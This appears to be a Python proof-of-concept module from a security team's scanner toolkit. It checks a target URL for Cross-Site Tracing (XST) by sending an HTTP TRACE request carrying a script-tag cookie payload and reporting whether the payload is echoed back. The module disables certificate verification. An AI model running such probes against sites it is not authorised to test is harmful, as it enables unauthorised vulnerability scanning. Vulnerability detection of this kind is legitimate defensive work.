'''
Function:
    XST 检测
Author:
    花果山
Wechat official account：
    中龙 红客突击队
Official website：
    https://www.hscsec.cn/
Email：
    spmonkey@hscsec.cn
Blog:
    https://spmonkey.github.io/
GitHub:
    https://github.com/spmonkey/
'''
# -*- coding: utf-8 -*-
import requests
import random
import string
from urllib.parse import urlparse
from requests.packages.urllib3 import disable_warnings
disable_warnings()


class poc:
    def __init__(self, url, proxies):
        self.url = url
        self.headers = {
            'User-Agent': 'Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1; .NET CLR 3.0.04506.30)',
        }
        self.result_text = ""
        self.proxies = proxies

    def vuln(self):
        url = self.url
        char = ''.join(random.sample(string.ascii_letters + string.digits, 8))
        payload = "test" + char
        self.headers['Cookie'] = "<script>alert({})</script>".format(payload)
        try:
            result = requests.request(method="TRACE", url=url, headers=self.headers, verify=False, timeout=3, proxies=self.proxies)
            if payload in result.text:
                target = urlparse(url)
                if target.query != "":
                    self.result_text += """\n        [+]    \033[32m检测到目标站点存在跨站式追踪攻击漏洞\033[0m
                 TRACE {} HTTP/1.1
                 Host: {}""".format(target.path + "?" + target.query, target.netloc)
                else:
                    self.result_text += """\n        [+]    \033[32m检测到目标站点存在跨站式追踪攻击漏洞\033[0m
                 TRACE {} HTTP/1.1
                 Host: {}""".format(target.path, target.netloc)
                for request_type, request_text in dict(result.request.headers).items():
                    self.result_text += "\n                 {}: {}".format(request_type, request_text)
                return True
            else:
                return False
        except:
            return False

    def main(self):
        if self.vuln():
            return self.result_text
        else:
            return False

